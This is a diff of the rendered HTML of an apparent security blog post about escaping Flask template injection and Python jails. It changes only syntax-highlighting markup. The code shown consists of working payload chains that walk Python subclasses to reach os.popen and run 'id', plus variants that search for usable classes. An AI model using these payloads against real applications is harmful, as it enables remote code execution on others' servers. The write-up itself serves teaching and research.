@@ -9,7 +9,7 @@ injection wherein he mentions a way to &ldquo;gadget&rdquo; our way out of Flask
 Kudos to him for sharing this technique.</p><p>For those of you reluctant to watch a 10 minute video (although I&rsquo;d highly recommend watching it), here&rsquo;s the gist of it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>__base__
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>__subclasses__()[<span style=color:#ae81ff>141</span>]
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>__init__
+</span></span><span style=display:flex><span><span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;sys&#39;</span>]
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#39;os&#39;</span>]
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;id&#39;</span>)
@@ -31,7 +31,7 @@ the <code>''.__class__.__base__.__subclasses__()</code> list instead of hardcodi
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>lambda</span> x: <span style=color:#e6db74>&#39;catch_warnings&#39;</span> <span style=color:#f92672>==</span> x<span style=color:#f92672>.</span>__name__,
 </span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__base__<span style=color:#f92672>.</span>__subclasses__()
 </span></span><span style=display:flex><span>  )
-</span></span><span style=display:flex><span>)<span style=color:#f92672>.</span>__init__
+</span></span><span style=display:flex><span>)<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;sys&#39;</span>]
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#39;os&#39;</span>]
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;id&#39;</span>)<span style=color:#f92672>.</span>read()
@@ -39,8 +39,8 @@ the <code>''.__class__.__base__.__subclasses__()</code> list instead of hardcodi
 </code></pre><p>This solves the problem but what do we do when the jail restricts access to <code>warnings.catch_warnings</code>?</p><p>Expanding upon the aforementioned idea, we can look for other subclasses which make use of <code>sys</code>
 by running the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>names <span style=color:#f92672>=</span> list()
 </span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__base__<span style=color:#f92672>.</span>__subclasses__():
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> hasattr(x<span style=color:#f92672>.</span>__init__, <span style=color:#e6db74>&#39;__globals__&#39;</span>)
-</span></span><span style=display:flex><span>	<span style=color:#f92672>and</span> x<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;sys&#39;</span>):
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> hasattr(x<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>, <span style=color:#e6db74>&#39;__globals__&#39;</span>)
+</span></span><span style=display:flex><span>	<span style=color:#f92672>and</span> x<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span><span style=color:#f92672>.</span>__globals__<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;sys&#39;</span>):
 </span></span><span style=display:flex><span>		names<span style=color:#f92672>.</span>append(x<span style=color:#f92672>.</span>__name__)
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#f92672>from</span> pprint <span style=color:#f92672>import</span> pprint
@@ -84,7 +84,7 @@ of them, thereby executing the system commands.</p><div class=highlight><pre tab
 </span></span><span style=display:flex><span> 			<span style=color:#e6db74>&#39;_BaseExitStack&#39;</span>],
 </span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__base__<span style=color:#f92672>.</span>__subclasses__()
 </span></span><span style=display:flex><span>  )
-</span></span><span style=display:flex><span>)<span style=color:#f92672>.</span>__init__
+</span></span><span style=display:flex><span>)<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;sys&#39;</span>]
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#39;os&#39;</span>]
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;id&#39;</span>)<span style=color:#f92672>.</span>read()
@@ -92,17 +92,17 @@ of them, thereby executing the system commands.</p><div class=highlight><pre tab
 </span></span><span style=display:flex><span>	filter(
 </span></span><span style=display:flex><span>		<span style=color:#66d9ef>lambda</span> x:
 </span></span><span style=display:flex><span>			hasattr(
-</span></span><span style=display:flex><span>				x<span style=color:#f92672>.</span>__init__,
+</span></span><span style=display:flex><span>				x<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>,
 </span></span><span style=display:flex><span>				<span style=color:#e6db74>&#39;__globals__&#39;</span>
 </span></span><span style=display:flex><span>			)
-</span></span><span style=display:flex><span>			<span style=color:#f92672>and</span> x<span style=color:#f92672>.</span>__init__
+</span></span><span style=display:flex><span>			<span style=color:#f92672>and</span> x<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>
 </span></span><span style=display:flex><span>			<span style=color:#f92672>.</span>__globals__
 </span></span><span style=display:flex><span>			<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;sys&#39;</span>),
 </span></span><span style=display:flex><span>			<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__
 </span></span><span style=display:flex><span>			<span style=color:#f92672>.</span>__base__
 </span></span><span style=display:flex><span>			<span style=color:#f92672>.</span>__subclasses__()
 </span></span><span style=display:flex><span>	)
-</span></span><span style=display:flex><span>)<span style=color:#f92672>.</span>__init__
+</span></span><span style=display:flex><span>)<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;sys&#39;</span>]
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#39;os&#39;</span>]
 </span></span><span style=display:flex><span><span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;id&#39;</span>)<span style=color:#f92672>.</span>read()
